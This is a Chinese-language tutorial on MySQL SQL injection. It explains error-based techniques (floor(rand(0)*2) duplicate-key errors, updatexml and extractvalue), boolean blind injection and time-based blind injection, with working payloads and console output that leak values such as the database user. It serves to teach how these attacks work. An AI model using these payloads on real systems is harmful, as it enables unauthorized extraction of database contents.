### 基于报错注入：
##### 1. 重复数据报错
###### 1.1 基于主键的唯一性：
如果一个表尝试生成两个相同的主键，就会爆出主键重复错误：
`Duplicate entry '1' for key 'group_key'`
利用 `floor(rand(0)*2)` 等注入手法

---- 原理：
通过多次测试观察发现，每次执行
`select rand(0) from information_schema.tables limit x,3;`
rand(0)产生的值都是固定的。
```
mysql> select rand(0) from information_schema.tables limit 0,3;
+---------------------+
| rand(0)              |
+---------------------+
| 0.15522042769493574  |
| 0.620881741513388    |
| 0.6387474552157777   |
+---------------------+
3 rows in set (0.00 sec)
mysql> select rand(0) from information_schema.tables limit 3,3;
+---------------------+
| rand(0)              |
+---------------------+
| 0.15522042769493574  |
| 0.620881741513388    |
| 0.6387474552157777   |
+---------------------+
3 rows in set (0.00 sec)
mysql> select rand(0) from information_schema.tables limit 6,3;
+---------------------+
| rand(0)              |
+---------------------+
| 0.15522042769493574  |
|  0.620881741513388   |
|  0.6387474552157777  |
+---------------------+
3 rows in set (0.00 sec)
```
---- 构造一个报`Duplicate`的错误的SQL语句：
```
select count(*) from information_schema.tables group by floor(rand(0)*2);
ERROR 1062 (23000): Duplicate entry '1' for key 'group_key'
```
当进行`count(*),group by`计算时，MySQL会创建一个虚拟表，虚拟表由主键列和`count(*)`两列组成，同时`floor(rand(0)*2)`会被计算多次，
计算多次是指在取数据使用`group by`时，进行一次`floor(rand(0)*2)`，
如果虚拟表中不存在此数据时，那么在往虚拟表插入数据时，`floor(rand(0)*2)`将会再被计算一次。

接下来分析,取数据表第一条记录时第一次使用`group by`,计算`floor(rand(0)*2)`的值为0,查询虚拟表发现0这个主键不存在,于是再次计算`floor(rand(0)*2)`结果为1,将1作为主键插入虚拟表,这时主键1的`count(*)`值为1,接下来取数据表第二条记录时第二次使用`group by`,计算`floor(rand(0)*2)`,结果为1,然后查询虚拟表,发现1的键值存在,于是`count(*)`的值加1,取数据表第三条记录时第三次使用`group by`,计算`floor(rand(0)*2)`值为0,查询虚拟表,发现0的键值不存在,于是再一次计算`floor(rand(0)*2)`,结果为1,当尝试将1插入虚拟表中时,发现主键1已经存在,所以报出主键重复的错误,整个过程中查询了`information_schema.tables`这个表3条记录发生报错,这也是报错为什么需要数据表的记录多到至少为3条的原因

---- 实际使用的操作SQL语句：
```
select * from user where id=1 and (select count(*) from information_schema.tables group by concat(floor(rand(0)*2),0x3a,user()));
ERROR 1062 (23000): Duplicate entry '1:root@localhost' for key 'group_key'
```
`'1:root@localhost'` 这里就显示出了隐私数据。

###### 1.2 基于列名的唯一性
如果我们在一个表中构造了两个相同的列名，就会产生`Duplicate column name`的错误，
利用`NAME_CONST`，或利用`join`和`using`关键字连接同一个表创建子查询进行报错。
##### 2. 基于类型不一致报错
MySQL的一些函数参数要求的是什么数据类型，如果数据类型不符合就会报错
利用`updatexml`，`extractvalue`等注入手法
```
mysql> select * from user where id=1 and updatexml(1,(concat(1,user())),1);
ERROR 1105 (HY000): XPATH syntax error: 'root@localhost'
```
```
mysql> select * from user where id=1 and extractvalue(1,(concat(1,user())));
ERROR 1105 (HY000): XPATH syntax error: 'root@localhost'
```
##### 3. 基于BIGINT溢出错误的SQL注入，根据超出最大整数溢出产生的错误、
##### 4. 一些MySQL空间函数
`geometrycollection(),multipoint(),polygon(),multipolygon(),linestring(),multilinestring()，`
通过这些报错会产生`Illegal non geometric`错误

### 基于布尔盲注
获取表名：
`select table_name from information_schema.tables where table_schema=database() limit 0,1;
`
获取表名第一个字符：
`select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) as xxx;`
获取表明第一个字符的ASCII值：
`select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) as xxx;`
根据返回结果的真假来判断所要猜测的内容是否为真。

--- 注入步骤：
1. 获取数据库名长度`length(database())`
2. 通过猜测数据库名的每一个字符猜测数据库名，通过比较ASCII值的大小（利用二分法减少比较次数）
举例：当前数据库名为test
通过下面的方法可以猜出数据库名称的第一个字母为t，依次类推可猜解处数据库名称。
```
mysql> select ascii(substr(database(),1,1))<115 as xxx;
+------+
| xxx  |
+------+
|    0 |
+------+
1 row in set (0.00 sec)

mysql> select ascii(substr(database(),1,1))<117 as xxx;
+------+
| xxx  |
+------+
|    1 |
+------+
1 row in set (0.00 sec)
```
3. 仿照上面的方法可以分别猜测 数据表，字段，数据的具体内容。

### 基于时间盲注
首先，了解`if`的用法
`if(expr,1,2) --- 如果expr为true，则执行1；否则，执行2`
通过判断SQL语句的执行时间来判断所要猜测的内容是否为真。
```
mysql> select if(ascii(substr(database(),1,1))<117,sleep(5),null) as xxx;
该SQL语句会等待5秒钟才会显示结果。
+------+
| xxx  |
+------+
|    0 |
+------+
1 row in set (5.00 sec)

mysql> select if(ascii(substr(database(),1,1))<115,sleep(5),null) as xxx;
+------+
| xxx  |
+------+
| NULL |
+------+
1 row in set (0.00 sec)
```
借此，可以一个一个字符的猜测所需要的内容。
